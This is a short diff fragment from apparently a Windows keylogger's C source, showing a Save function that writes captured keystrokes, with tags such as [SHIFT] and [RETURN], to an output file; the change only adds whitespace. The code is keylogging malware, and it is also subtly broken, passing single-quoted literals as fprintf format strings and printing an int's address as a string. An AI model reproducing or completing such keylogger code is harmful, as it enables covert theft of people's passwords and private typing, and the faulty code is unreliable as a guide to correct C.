@@ -54,15 +54,21 @@ int Save(int _key, char *file) {
    
   // If a key is the SHIFT key, the BACK key, the RETURN key, or the ESCAPE key, write it as that [KEY]. Else, write the key pressed.
   if (_key == VK_SHIFT)
+    
     fprintf(OUTPUT_FILE, '%s', "[SHIFT]");
-  else if(_key == VK_BACK)
+  else if (_key == VK_BACK)
+    
     fprintf(OUTPUT_FILE, '%s', "[BACK]");
-  else if(_key == VK_RETURN)
+  else if (_key == VK_RETURN)
+    
     fprintf(OUTPUT_FILE,'%s', "[RETURN]");
-  else if(_key == VK_ESCAPE)
+  else if (_key == VK_ESCAPE)
+    
     fprintf(OUTPUT_FILE, '%s', "[ESCAPE]");
   else
+    
     fprintf(OUTPUT_FILE, '%s', &_key);
+  
   fclose(OUTPUT_FILE); // Close the file
   
   // Return exit code 0
